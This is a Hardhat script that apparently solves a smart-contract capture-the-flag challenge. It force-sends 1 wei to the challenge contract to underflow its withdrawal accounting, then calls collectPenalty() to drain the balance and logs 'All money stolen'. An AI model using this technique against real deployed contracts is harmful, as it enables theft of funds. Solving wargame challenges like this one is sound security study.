import { ethers } from "hardhat";

const myAddress = "0xD028d504316FEc029CFa36bdc3A8f053F6E5a6e4";
const challengeContractAddress = "0x75D093b97e31e51e9f62c614F2C70E3F886BbfDF";
const abi = [
  "function collectPenalty() external",
  "function isComplete() public view returns (bool)",
];

async function main() {
  const mySigner = await ethers.getSigner(myAddress);
  const challengeContract = new ethers.Contract(
    challengeContractAddress,
    abi,
    mySigner
  );

  // send some ether to the contract to make the `uint256 withdrawn = startBalance - address(this).balance;` underflow
  const RetirementFundChallengeAttack = await ethers.getContractFactory(
    "RetirementFundChallengeAttack"
  );
  const forceSendEthContract = await RetirementFundChallengeAttack.deploy(
    challengeContractAddress,
    { value: 1 }
  );
  await forceSendEthContract.deployed();

  console.log("1 wei force sent to the contract");

  const collectTx = await challengeContract.collectPenalty();
  await collectTx.wait();
  console.log("All money stolen");

  const success = await challengeContract.isComplete();
  console.log(`Attack success: ${success}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
